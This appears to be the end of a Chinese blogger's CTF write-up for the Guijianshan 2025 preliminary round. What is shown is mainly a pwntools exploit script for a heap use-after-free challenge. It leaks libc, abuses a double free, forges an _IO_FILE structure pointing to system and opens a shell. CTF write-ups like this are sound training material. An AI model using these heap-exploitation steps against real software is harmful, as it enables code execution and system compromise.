<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, shlex, time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">prog = ELF(bin_path)</span><br><span class="line">io = process([bin_path] + args)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uqword</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> u64(data.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">grab_u64_nl</span>(<span class="params">sock</span>):</span><br><span class="line">    line = sock.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> uqword(line)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait_menu</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">act</span>(<span class="params">op</span>):</span><br><span class="line">    wait_menu()</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(op).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_chunk</span>(<span class="params">sz, data=<span class="string">b&quot;A&quot;</span></span>):</span><br><span class="line">    act(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size&quot;</span>, <span class="built_in">str</span>(sz).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;content&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rm_chunk</span>(<span class="params">idx</span>):</span><br><span class="line">    act(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_chunk</span>(<span class="params">idx, stuff</span>):</span><br><span class="line">    act(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;content&quot;</span>, stuff)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_chunk</span>(<span class="params">idx</span>):</span><br><span class="line">    act(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">add_chunk(<span class="number">0x400</span>)</span><br><span class="line">add_chunk(<span class="number">0x1f8</span>)</span><br><span class="line">add_chunk(<span class="number">0x1f8</span>)</span><br><span class="line"></span><br><span class="line">rm_chunk(<span class="number">0</span>)</span><br><span class="line">dump_chunk(<span class="number">0</span>)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">arena_leak = grab_u64_nl(io)</span><br><span class="line">libc_base = arena_leak - <span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">f&quot;[+] LIBC base = <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">target_fd = libc_base + (<span class="number">0x3c67f8</span> - <span class="number">0x10</span>)</span><br><span class="line">fake_meta = p64(<span class="number">0</span>) + p64(target_fd)</span><br><span class="line">mod_chunk(<span class="number">0</span>, fake_meta)</span><br><span class="line"></span><br><span class="line">add_chunk(<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">rm_chunk(<span class="number">1</span>)</span><br><span class="line">rm_chunk(<span class="number">2</span>)</span><br><span class="line">rm_chunk(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">stdout_hook = libc_base + <span class="number">0x3c55a7</span></span><br><span class="line"></span><br><span class="line">add_chunk(<span class="number">0x1f8</span>, p64(stdout_hook))</span><br><span class="line">add_chunk(<span class="number">0x1f8</span>)</span><br><span class="line">add_chunk(<span class="number">0x1f8</span>)</span><br><span class="line">add_chunk(<span class="number">0x1f8</span>)</span><br><span class="line"></span><br><span class="line">system_off = <span class="number">0x45390</span> + <span class="number">0x10</span></span><br><span class="line">system_addr = libc_base + system_off</span><br><span class="line">stdout_addr = libc_base + <span class="number">0x3c5620</span></span><br><span class="line">fake_jump = libc_base + <span class="number">0x203260</span></span><br><span class="line"></span><br><span class="line">fake_io = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="string">b&quot;sh\x00&quot;</span>,</span><br><span class="line">    <span class="number">0x18</span>: p64(<span class="number">1</span>),</span><br><span class="line">    <span class="number">0x20</span>: p64(<span class="number">2</span>),</span><br><span class="line">    <span class="number">0xc0</span>: p64(<span class="number">1</span>),</span><br><span class="line">    <span class="number">0xa0</span>: p64(stdout_addr),</span><br><span class="line">    <span class="number">0xd8</span>: p64(libc_base + <span class="number">0x3c3260</span> + <span class="number">0x30</span>),</span><br><span class="line">    <span class="number">0xe0</span>: p64(stdout_addr + <span class="number">0xe8</span> - <span class="number">0x18</span>),</span><br><span class="line">    <span class="number">0xe8</span>: p64(system_addr),</span><br><span class="line">    <span class="number">0x130</span>: p64(stdout_addr + <span class="number">0x138</span> - <span class="number">0x18</span>),</span><br><span class="line">    <span class="number">0x138</span>: p64(system_addr),</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">b&quot;B&quot;</span> * <span class="number">0x69</span></span><br><span class="line">mod_chunk(<span class="number">7</span>, prefix + fake_io)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;ls&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://www.blog.st4rr.top">St4rr</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://www.blog.st4rr.top/posts/4c6e0169/">https://www.blog.st4rr.top/posts/4c6e0169/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener external nofollow noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/%E5%8F%A4%E5%89%91%E5%B1%B1/">古剑山</a></div><div class="post_share"><div class="social-share" data-image="/img/article/Black_hole.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/91ad15d9/" title="HSCCTF2025 Writeup"><img class="cover" src="/img/article/milkyway.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">HSCCTF2025 Writeup</div></div></a></div><div class="next-post pull-right"><a href="/posts/6fbde62c/" title="龙信杯2025 部分writeup+复现"><img class="cover" src="/img/article/Crab_Nebula.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">龙信杯2025 部分writeup+复现</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/posts/58e12fb0/" title="0xGame2023 Writeup"><img class="cover" src="/img/article/Pillars_of_creation.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-24</div><div class="title">0xGame2023 Writeup</div></div></a></div><div><a href="/posts/e41c2619/" title="2024暑假偷偷练习CTF"><img class="cover" src="/img/article/milkyway.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-28</div><div class="title">2024暑假偷偷练习CTF</div></div></a></div><div><a href="/posts/ec5b4352/" title="0xGame2025 大而美 Official Writeup"><img class="cover" src="/img/article/sirius.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-31</div><div class="title">0xGame2025 大而美 Official Writeup</div></div></a></div><div><a href="/posts/511d172f/" title="0xGame2024 Misc Official Writeup"><img class="cover" src="/img/article/Orion_Nebula.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-11</div><div class="title">0xGame2024 Misc Official Writeup</div></div></a></div><div><a href="/posts/33892b4f/" title="2025江苏移动赋能建功网络安全技能竞赛 个人赛 Writeup"><img class="cover" src="/img/article/Hoag.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-29</div><div class="title">2025江苏移动赋能建功网络安全技能竞赛 个人赛 Writeup</div></div></a></div><div><a href="/posts/fabac5e4/" title="BeginCTF2024 Writeup"><img class="cover" src="/img/article/proxima_centauri.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-06</div><div class="title">BeginCTF2024 Writeup</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/grey_bwm.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">St4rr</div><div class="author-info__description">A human, not a robot, I guess.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">99</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">69</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/123Starr"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">人生如戏，幕起缘来，欢迎光临寒舍:) 本站大多是对一些比赛的记录和一些胡言乱语，教学意义并不大，因此感谢每一个愿意读完本站文章的师傅orz 如果想联系作者，可移步至Comment板块留言:)</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B0%B4%E6%9E%9C"><span class="toc-number">1.1.</span> <span class="toc-text">水果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hundred"><span class="toc-number">1.2.</span> <span class="toc-text">hundred</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudoku"><span class="toc-number">1.3.</span> <span class="toc-text">sudoku</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#baby_ssti"><span class="toc-number">2.1.</span> <span class="toc-text">baby_ssti</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hellocms"><span class="toc-number">2.2.</span> <span class="toc-text">HelloCms</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-number">3.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyre"><span class="toc-number">3.1.</span> <span class="toc-text">babyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#helloworld"><span class="toc-number">3.2.</span> <span class="toc-text">helloworld</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#veryez"><span class="toc-number">3.3.</span> <span class="toc-text">veryez</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyre"><span class="toc-number">3.4.</span> <span class="toc-text">easyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#final"><span class="toc-number">3.5.</span> <span class="toc-text">final</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sol"><span class="toc-number">4.1.</span> <span class="toc-text">sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#common-rsa"><span class="toc-number">4.2.</span> <span class="toc-text">common rsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#aesstudy"><span class="toc-number">4.3.</span> <span class="toc-text">aesstudy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#work"><span class="toc-number">4.4.</span> <span class="toc-text">work</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easyuaf"><span class="toc-number">5.1.</span> <span class="toc-text">easyuaf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">5.1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">5.1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#o"><span class="toc-number">5.2.</span> <span class="toc-text">o</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/c18b8903/" title="鹏城杯2025初赛 Writeup"><img src="/img/article/Jupiter.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="鹏城杯2025初赛 Writeup"/></a><div class="content"><a class="title" href="/posts/c18b8903/" title="鹏城杯2025初赛 Writeup">鹏城杯2025初赛 Writeup</a><time datetime="2025-12-19T16:00:00.000Z" title="Created 2025-12-20 00:00:00">2025-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/91ad15d9/" title="HSCCTF2025 Writeup"><img src="/img/article/milkyway.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HSCCTF2025 Writeup"/></a><div class="content"><a class="title" href="/posts/91ad15d9/" title="HSCCTF2025 Writeup">HSCCTF2025 Writeup</a><time datetime="2025-12-07T16:00:00.000Z" title="Created 2025-12-08 00:00:00">2025-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4c6e0169/" title="古剑山2025 初赛 Writeup"><img src="/img/article/Black_hole.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="古剑山2025 初赛 Writeup"/></a><div class="content"><a class="title" href="/posts/4c6e0169/" title="古剑山2025 初赛 Writeup">古剑山2025 初赛 Writeup</a><time datetime="2025-11-29T16:00:00.000Z" title="Created 2025-11-30 00:00:00">2025-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/6fbde62c/" title="龙信杯2025 部分writeup+复现"><img src="/img/article/Crab_Nebula.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="龙信杯2025 部分writeup+复现"/></a><div class="content"><a class="title" href="/posts/6fbde62c/" title="龙信杯2025 部分writeup+复现">龙信杯2025 部分writeup+复现</a><time datetime="2025-11-14T16:00:00.000Z" title="Created 2025-11-15 00:00:00">2025-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/f294c61f/" title="数证杯2025 部分writeup+复现"><img src="/img/article/sirius.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数证杯2025 部分writeup+复现"/></a><div class="content"><a class="title" href="/posts/f294c61f/" title="数证杯2025 部分writeup+复现">数证杯2025 部分writeup+复现</a><time datetime="2025-11-06T16:00:00.000Z" title="Created 2025-11-07 00:00:00">2025-11-07</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/sea.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By St4rr</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="/js/tw_cn.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'roAKGMVGjOTZqTP1Wsfxs2qr-gzGzoHsz',
      appKey: 'hLDt4pnbOjyv8rnLljUjXedq',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: true
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>